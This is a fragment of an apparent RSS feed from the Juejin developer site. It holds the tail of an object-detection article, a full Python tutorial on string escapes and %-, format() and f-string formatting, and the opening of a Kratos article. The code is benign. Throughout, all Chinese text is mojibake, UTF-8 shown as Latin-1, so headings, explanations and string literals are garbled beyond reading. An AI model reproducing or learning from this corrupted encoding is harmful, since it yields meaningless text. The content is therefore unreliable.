<ol>
<li><strong>è‡ªå®šä¹‰ç›®æ ‡æ£€æµ‹ç®—æ³•</strong>ï¼šåŸºäº MMDetection æ¡†æ¶ï¼Œå®ç°è‡ªå®šä¹‰ç½‘ç»œç»“æ„å’ŒæŸå¤±å‡½æ•°ï¼Œæ»¡è¶³ç‰¹å®šåœºæ™¯éœ€æ±‚ï¼›</li>
<li><strong>å®ä¾‹åˆ†å‰²ä»»åŠ¡</strong>ï¼šä½¿ç”¨ Mask R-CNN ç­‰æ¨¡å‹ï¼Œå®ç°ç›®æ ‡æ£€æµ‹ä¸å®ä¾‹åˆ†å‰²çš„è”åˆä»»åŠ¡ï¼›</li>
<li><strong>å¤šå°ºåº¦è®­ç»ƒä¸æ¨ç†</strong>ï¼šæå‡å°ç›®æ ‡æ£€æµ‹ç²¾åº¦ï¼Œé€‚é…è¿œè·ç¦»ç›®æ ‡æ£€æµ‹åœºæ™¯ï¼›</li>
<li><strong>è¾¹ç¼˜è®¾å¤‡éƒ¨ç½²</strong>ï¼šå°†æ¨¡å‹è½¬æ¢ä¸º TensorRTã€OpenVINO æ ¼å¼ï¼Œéƒ¨ç½²åˆ° Jetson Nanoã€Raspberry Pi ç­‰è¾¹ç¼˜è®¾å¤‡ï¼›</li>
<li><strong>åŠç›‘ç£/å¼±ç›‘ç£å­¦ä¹ </strong>ï¼šåˆ©ç”¨å°‘é‡æ ‡æ³¨æ•°æ®å’Œå¤§é‡æ— æ ‡æ³¨æ•°æ®ï¼Œæå‡æ¨¡å‹ç²¾åº¦ï¼Œé™ä½æ ‡æ³¨æˆæœ¬ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pythonå­—ç¬¦ä¸²æ“ä½œå…¨è§£æï¼šä»åŸºç¡€å®šä¹‰åˆ°é«˜çº§æ ¼å¼åŒ–]]></title>    <link>https://juejin.cn/post/7590054976488423464</link>    <guid>https://juejin.cn/post/7590054976488423464</guid>    <pubDate>2026-01-01T14:48:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590054976488423464" data-draft-id="7589920318133256192" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pythonå­—ç¬¦ä¸²æ“ä½œå…¨è§£æï¼šä»åŸºç¡€å®šä¹‰åˆ°é«˜çº§æ ¼å¼åŒ–"/> <meta itemprop="keywords" content="Scala,åç«¯,ç¼–ç¨‹è¯­è¨€"/> <meta itemprop="datePublished" content="2026-01-01T14:48:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»Šå¤©æ²¡æœ‰ç›"/> <meta itemprop="url" content="https://juejin.cn/user/1408937846645355"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Pythonå­—ç¬¦ä¸²æ“ä½œå…¨è§£æï¼šä»åŸºç¡€å®šä¹‰åˆ°é«˜çº§æ ¼å¼åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1408937846645355/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»Šå¤©æ²¡æœ‰ç›
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T14:48:00.000Z" title="Thu Jan 01 2026 14:48:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å¼•è¨€ï¼šå­—ç¬¦ä¸²åœ¨Pythonç¼–ç¨‹ä¸­çš„é‡è¦æ€§</h2>
<p>å­—ç¬¦ä¸²æ˜¯Pythonä¸­æœ€åŸºæœ¬ã€æœ€å¸¸ç”¨çš„æ•°æ®ç±»å‹ä¹‹ä¸€ï¼Œå‡ ä¹æ‰€æœ‰çš„ç¨‹åºéƒ½ç¦»ä¸å¼€å­—ç¬¦ä¸²å¤„ç†ã€‚æ— è®ºæ˜¯ç”¨æˆ·äº¤äº’ã€æ•°æ®å­˜å‚¨ã€æ–‡ä»¶æ“ä½œè¿˜æ˜¯ç½‘ç»œé€šä¿¡ï¼Œå­—ç¬¦ä¸²éƒ½æ‰®æ¼”ç€è‡³å…³é‡è¦çš„è§’è‰²ã€‚æœ¬æ–‡å°†å…¨é¢è§£æPythonå­—ç¬¦ä¸²çš„å„ä¸ªæ–¹é¢ï¼ŒåŒ…æ‹¬å­—ç¬¦ä¸²çš„å®šä¹‰æ–¹å¼ã€è½¬ä¹‰å­—ç¬¦çš„ä½¿ç”¨ï¼Œä»¥åŠä¸‰ç§ä¸åŒçš„å­—ç¬¦ä¸²æ ¼å¼åŒ–æ–¹æ³•ï¼Œå¸®åŠ©ä½ æŒæ¡å­—ç¬¦ä¸²å¤„ç†çš„ç²¾é«“ã€‚</p>
<h2 data-id="heading-1">äºŒã€å­—ç¬¦ä¸²åŸºç¡€ï¼šå®šä¹‰ä¸è½¬ä¹‰å­—ç¬¦</h2>
<h3 data-id="heading-2">æ¡ˆä¾‹1ï¼šå­—ç¬¦ä¸²å®šä¹‰ä¸è½¬ä¹‰å­—ç¬¦æ¼”ç¤º</h3>
<p><strong>é—®é¢˜æè¿°</strong>ï¼šå±•ç¤ºPythonä¸­å­—ç¬¦ä¸²çš„ä¸åŒå®šä¹‰æ–¹å¼ä»¥åŠå¸¸è§è½¬ä¹‰å­—ç¬¦çš„ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»Šå¤©å¤©æ°”ä¸é”™"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'ä»Šå¤©å››èŠ‚è¯¾'</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ˜ŸæœŸä¸‰å°±è¦è¿åŠ¨ä¼šäº†"</span>)
<span class="hljs-comment">#Let's Python</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Let's Python"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'Let\'s Python'</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"E:\\newTime"</span>)
</code></pre>
<p><strong>è¿è¡Œç»“æœï¼š</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c77e23baf4c4173945fbefd2b0d81f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LuK5aSp5rKh5pyJ55uQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767883867&amp;x-signature=%2BesaXdHGnvg4WHqE9aylfg6skR0%3D" alt="5.png" loading="lazy"/>
<strong>ä»£ç åˆ†æï¼š</strong></p>
<p>è¿™æ®µä»£ç å±•ç¤ºäº†Pythonå­—ç¬¦ä¸²çš„å¤šç§å®šä¹‰æ–¹å¼å’Œè½¬ä¹‰å­—ç¬¦çš„åº”ç”¨ï¼š</p>
<ol>
<li>
<p><strong>ä¸‰ç§å­—ç¬¦ä¸²å®šä¹‰æ–¹å¼</strong>ï¼š</p>
<ul>
<li>åŒå¼•å·å­—ç¬¦ä¸²ï¼š<code>"ä»Šå¤©å¤©æ°”ä¸é”™"</code></li>
<li>å•å¼•å·å­—ç¬¦ä¸²ï¼š<code>'ä»Šå¤©å››èŠ‚è¯¾'</code></li>
<li>ä¸‰å¼•å·å­—ç¬¦ä¸²ï¼šå¯ä»¥åŒ…å«å¤šè¡Œæ–‡æœ¬ï¼ˆè™½ç„¶è¿™é‡Œåªå±•ç¤ºäº†ä¸€è¡Œï¼‰</li>
</ul>
</li>
<li>
<p><strong>å­—ç¬¦ä¸²ä¸­çš„å¼•å·å¤„ç†</strong>ï¼š</p>
<ul>
<li><code>"Let's Python"</code>ï¼šåœ¨åŒå¼•å·å­—ç¬¦ä¸²ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨å•å¼•å·</li>
<li><code>'Let\'s Python'</code>ï¼šåœ¨å•å¼•å·å­—ç¬¦ä¸²ä¸­ä½¿ç”¨å•å¼•å·éœ€è¦è½¬ä¹‰</li>
<li>è¿™ç§çµæ´»æ€§ä½¿å¾—æˆ‘ä»¬å¯ä»¥æ ¹æ®éœ€è¦é€‰æ‹©å¼•å·ç±»å‹</li>
</ul>
</li>
<li>
<p><strong>è½¬ä¹‰å­—ç¬¦çš„ä½¿ç”¨</strong>ï¼š</p>
<ul>
<li><code>\'</code>ï¼šè½¬ä¹‰å•å¼•å·ï¼Œé¿å…å­—ç¬¦ä¸²æå‰ç»“æŸ</li>
<li><code>\\</code>ï¼šè½¬ä¹‰åæ–œæ æœ¬èº«ï¼Œè¡¨ç¤ºæ™®é€šçš„åæ–œæ å­—ç¬¦</li>
<li>å…¶ä»–å¸¸è§è½¬ä¹‰å­—ç¬¦ï¼š
<ul>
<li><code>\n</code>ï¼šæ¢è¡Œç¬¦</li>
<li><code>\t</code>ï¼šæ°´å¹³åˆ¶è¡¨ç¬¦ï¼ˆç¼©è¿›ï¼‰</li>
<li><code>\r</code>ï¼šå›è½¦ç¬¦</li>
<li><code>\b</code>ï¼šé€€æ ¼ç¬¦</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 data-id="heading-3">ä¸‰ã€å­—ç¬¦ä¸²æ ¼å¼åŒ–æ–¹æ³•å¯¹æ¯”</h2>
<h3 data-id="heading-4">æ¡ˆä¾‹2ï¼šä¸‰ç§å­—ç¬¦ä¸²æ ¼å¼åŒ–æ–¹æ³•å®è·µ</h3>
<p><strong>é—®é¢˜æè¿°</strong>ï¼šå¯¹æ¯”æ¼”ç¤ºPythonä¸­ä¸‰ç§ä¸»è¦çš„å­—ç¬¦ä¸²æ ¼å¼åŒ–æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-python" lang="python">name = <span class="hljs-string">"å¼ ä¸‰"</span>
age = <span class="hljs-number">25</span>
address = <span class="hljs-string">"æ¹–åŒ—æ½œæ±Ÿ"</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å§“åä¸ºï¼š"</span>,name)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å¹´é¾„æ˜¯ï¼š"</span>,age)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åœ°å€ä¸ºï¼š"</span>,address)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"å§“åä¸ºï¼š"</span>,name,<span class="hljs-string">"å¹´é¾„æ˜¯ï¼š"</span>,age,<span class="hljs-string">"åœ°å€ä¸ºï¼š"</span>,address)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"å§“åä¸ºï¼š%så¹´é¾„æ˜¯ï¼š%dåœ°å€ä¸ºï¼š%s"</span>%(name,age,address))

<span class="hljs-built_in">print</span>(<span class="hljs-string">"å§“åä¸ºï¼š%så¹´é¾„æ˜¯ï¼š%dåœ°å€ä¸ºï¼š%s"</span>%(address,age,name))
</code></pre>
<p><strong>è¿è¡Œç»“æœï¼š</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/465c763120684719bd642b954066c881~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LuK5aSp5rKh5pyJ55uQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767883867&amp;x-signature=gpm%2Fqe8RW2cDDEB2sGUGUFbN8Go%3D" alt="6.png" loading="lazy"/>
<strong>ä»£ç åˆ†æï¼š</strong></p>
<p>è¿™æ®µä»£ç æ¼”ç¤ºäº†ä»ç®€å•è¾“å‡ºåˆ°æ ¼å¼åŒ–è¾“å‡ºçš„æ¼”è¿›ï¼š</p>
<ol>
<li>
<p><strong>åŸºç¡€è¾“å‡ºæ–¹æ³•</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨å¤šä¸ª<code>print</code>è¯­å¥åˆ†åˆ«è¾“å‡º</li>
<li>ä½¿ç”¨é€—å·åˆ†éš”å¤šä¸ªå˜é‡ï¼Œè‡ªåŠ¨æ·»åŠ ç©ºæ ¼</li>
</ul>
</li>
<li>
<p><strong>%æ ¼å¼åŒ–æ–¹æ³•ï¼ˆæ—§å¼æ ¼å¼åŒ–ï¼‰</strong>ï¼š</p>
<ul>
<li>æ ¼å¼ï¼š<code>"æ ¼å¼åŒ–å­—ç¬¦ä¸²" % (å˜é‡1, å˜é‡2, ...)</code></li>
<li><code>%s</code>ï¼šå­—ç¬¦ä¸²å ä½ç¬¦</li>
<li><code>%d</code>ï¼šæ•´æ•°å ä½ç¬¦</li>
<li>æ³¨æ„é¡ºåºï¼šå ä½ç¬¦é¡ºåºå¿…é¡»ä¸å˜é‡é¡ºåºä¸€è‡´</li>
</ul>
</li>
<li>
<p><strong>é¡ºåºé‡è¦æ€§</strong>ï¼š</p>
<ul>
<li>æœ€åä¸€è¡Œå±•ç¤ºäº†é”™è¯¯çš„é¡ºåºå¯¼è‡´çš„æ•°æ®é”™ä½</li>
<li>è¿™æ˜¯%æ ¼å¼åŒ–æ–¹æ³•çš„ä¸€ä¸ªç¼ºç‚¹</li>
</ul>
</li>
</ol>
<h3 data-id="heading-5">æ¡ˆä¾‹3ï¼šformat()æ–¹æ³•æ ¼å¼åŒ–</h3>
<p><strong>é—®é¢˜æè¿°</strong>ï¼šæ¼”ç¤ºformat()æ–¹æ³•çš„å¤šç§ä½¿ç”¨æ–¹å¼ã€‚</p>
<pre><code class="hljs language-python" lang="python">name = <span class="hljs-string">"å°é»‘"</span>
age = <span class="hljs-number">18</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å§“åï¼š"</span>,name)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å§“åï¼š%s"</span>%name)
<span class="hljs-built_in">str</span> = <span class="hljs-string">"å§“åï¼š{}å¹´é¾„ä¸ºï¼š{}"</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.<span class="hljs-built_in">format</span>(name,age))
str1 = <span class="hljs-string">"å§“åï¼š{1}å¹´é¾„ä¸ºï¼š{0}"</span>
<span class="hljs-built_in">print</span>(str1.<span class="hljs-built_in">format</span>(name,age))
<span class="hljs-built_in">print</span>(<span class="hljs-string">"----------------------------"</span>)
name1 = <span class="hljs-string">"å¤§ç™½"</span>
age1 = <span class="hljs-number">25</span>
str1 = <span class="hljs-string">"å§“åï¼š{name2}å¹´é¾„ä¸ºï¼š{age2}"</span>
<span class="hljs-built_in">print</span>(str1.<span class="hljs-built_in">format</span>(name2 = name1,age2 = age1))

<span class="hljs-built_in">print</span>(<span class="hljs-string">"å§“åï¼š{name2}å¹´é¾„ä¸ºï¼š{age2}"</span>.<span class="hljs-built_in">format</span>(age2 = age1,name2 = name1))
<span class="hljs-built_in">print</span>(<span class="hljs-string">"------------------------------"</span>)
a = <span class="hljs-number">19</span>
b = <span class="hljs-number">22</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰€å ç™¾åˆ†æ¯”ï¼š{:.2%}"</span>.<span class="hljs-built_in">format</span>(a/b))
</code></pre>
<p><strong>è¿è¡Œç»“æœï¼š</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14ecf71f38fa4ecc86e9641fba1a83e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LuK5aSp5rKh5pyJ55uQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767883867&amp;x-signature=R8Nb6cG3n1NsSEx%2FJCDRD7KqPz0%3D" alt="4.png" loading="lazy"/></p>
<p><strong>ä»£ç åˆ†æï¼š</strong></p>
<p>format()æ–¹æ³•æä¾›äº†æ›´çµæ´»ã€æ›´å¼ºå¤§çš„æ ¼å¼åŒ–åŠŸèƒ½ï¼š</p>
<ol>
<li>
<p><strong>ä½ç½®å‚æ•°æ ¼å¼åŒ–</strong>ï¼š</p>
<ul>
<li><code>{}</code>ï¼šç©ºèŠ±æ‹¬å·ï¼ŒæŒ‰é¡ºåºå¡«å……</li>
<li><code>{0}</code>ã€<code>{1}</code>ï¼šå¸¦ç´¢å¼•çš„èŠ±æ‹¬å·ï¼Œå¯ä»¥æŒ‡å®šå¡«å……é¡ºåº</li>
</ul>
</li>
<li>
<p><strong>å…³é”®å­—å‚æ•°æ ¼å¼åŒ–</strong>ï¼š</p>
<ul>
<li><code>{name}</code>ï¼šä½¿ç”¨å‘½åå‚æ•°ï¼Œä»£ç æ›´æ¸…æ™°</li>
<li>é¡ºåºæ— å…³ï¼šå…³é”®å­—å‚æ•°ä¸é¡ºåºæ— å…³ï¼Œæé«˜å¯è¯»æ€§</li>
</ul>
</li>
<li>
<p><strong>é«˜çº§æ ¼å¼åŒ–åŠŸèƒ½</strong>ï¼š</p>
<ul>
<li><code>{:.2%}</code>ï¼šæ ¼å¼åŒ–ä¸ºç™¾åˆ†æ¯”ï¼Œä¿ç•™ä¸¤ä½å°æ•°</li>
<li>å…¶ä»–æ ¼å¼é€‰é¡¹ï¼š
<ul>
<li><code>{:.2f}</code>ï¼šä¿ç•™ä¸¤ä½å°æ•°</li>
<li><code>{:10}</code>ï¼šæŒ‡å®šå®½åº¦ä¸º10</li>
<li><code>{:&lt;10}</code>ï¼šå·¦å¯¹é½ï¼Œå®½åº¦10</li>
<li><code>{:&gt;10}</code>ï¼šå³å¯¹é½ï¼Œå®½åº¦10</li>
<li><code>{:^10}</code>ï¼šå±…ä¸­å¯¹é½ï¼Œå®½åº¦10</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 data-id="heading-6">æ¡ˆä¾‹4ï¼šf-stringæ ¼å¼åŒ–ï¼ˆPython 3.6+ï¼‰</h3>
<p><strong>é—®é¢˜æè¿°</strong>ï¼šæ¼”ç¤ºæœ€æ–°çš„f-stringæ ¼å¼åŒ–æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-python" lang="python">age = <span class="hljs-number">20</span>
sex = <span class="hljs-string">'ç”·'</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¹´é¾„ï¼š<span class="hljs-subst">{age}</span>ï¼Œæ€§åˆ«ï¼š<span class="hljs-subst">{sex}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">F"å¹´é¾„ï¼š<span class="hljs-subst">{age}</span>ï¼Œæ€§åˆ«ï¼š<span class="hljs-subst">{sex}</span>"</span>)
</code></pre>
<p><strong>è¿è¡Œç»“æœï¼š</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/269a8503f5ac46268c8145e26030ea82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LuK5aSp5rKh5pyJ55uQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767883867&amp;x-signature=IOKwtDNt4nhfeuR13w3usdi%2BMjc%3D" alt="2.png" loading="lazy"/></p>
<h2 data-id="heading-7">å››ã€ä¸‰ç§æ ¼å¼åŒ–æ–¹æ³•å¯¹æ¯”æ€»ç»“</h2>















































<table><thead><tr><th>ç‰¹æ€§</th><th>%æ ¼å¼åŒ–</th><th>format()æ–¹æ³•</th><th>f-string</th></tr></thead><tbody><tr><td><strong>Pythonç‰ˆæœ¬</strong></td><td>æ‰€æœ‰ç‰ˆæœ¬</td><td>2.6+</td><td>3.6+</td></tr><tr><td><strong>è¯­æ³•ç®€æ´æ€§</strong></td><td>ä¸€èˆ¬</td><td>è¾ƒå¥½</td><td>ä¼˜ç§€</td></tr><tr><td><strong>å¯è¯»æ€§</strong></td><td>è¾ƒå·®</td><td>å¥½</td><td>ä¼˜ç§€</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>ä¸€èˆ¬</td><td>è¾ƒå¥½</td><td>ä¼˜ç§€</td></tr><tr><td><strong>çµæ´»æ€§</strong></td><td>æœ‰é™</td><td>é«˜</td><td>é«˜</td></tr><tr><td><strong>è¡¨è¾¾å¼æ”¯æŒ</strong></td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td><td>ç›´æ¥æ”¯æŒ</td></tr></tbody></table>
<h2 data-id="heading-8">å…­ã€æ€»ç»“</h2>
<p>é€šè¿‡æœ¬æ–‡çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å…¨é¢æŒæ¡äº†Pythonå­—ç¬¦ä¸²çš„æ ¸å¿ƒçŸ¥è¯†ï¼š</p>
<ol>
<li><strong>å­—ç¬¦ä¸²å®šä¹‰</strong>ï¼šå•å¼•å·ã€åŒå¼•å·ã€ä¸‰å¼•å·çš„ä½¿ç”¨åœºæ™¯</li>
<li><strong>è½¬ä¹‰å­—ç¬¦</strong>ï¼šå¤„ç†ç‰¹æ®Šå­—ç¬¦å’Œé¿å…è¯­æ³•å†²çª</li>
<li><strong>å­—ç¬¦ä¸²æ ¼å¼åŒ–</strong>ï¼š
<ul>
<li>%æ ¼å¼åŒ–ï¼šä¼ ç»Ÿæ–¹æ³•ï¼Œé€æ¸è¢«æ·˜æ±°</li>
<li>format()æ–¹æ³•ï¼šåŠŸèƒ½å¼ºå¤§ï¼Œå…¼å®¹æ€§å¥½</li>
<li>f-stringï¼šç°ä»£Pythonæ¨èçš„æ–¹å¼</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨ Kratos ä¸­è®¾ç½®è‡ªå®šä¹‰ HTTP å“åº”æ ¼å¼]]></title>    <link>https://juejin.cn/post/7590054976488538152</link>    <guid>https://juejin.cn/post/7590054976488538152</guid>    <pubDate>2026-01-01T16:41:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590054976488538152" data-draft-id="7589930672833773603" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨ Kratos ä¸­è®¾ç½®è‡ªå®šä¹‰ HTTP å“åº”æ ¼å¼"/> <meta itemprop="keywords" content="åç«¯,Go"/> <meta itemprop="datePublished" content="2026-01-01T16:41:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Charlie_Byte"/> <meta itemprop="url" content="https://juejin.cn/user/1968540037686224"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨ Kratos ä¸­è®¾ç½®è‡ªå®šä¹‰ HTTP å“åº”æ ¼å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1968540037686224/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Charlie_Byte
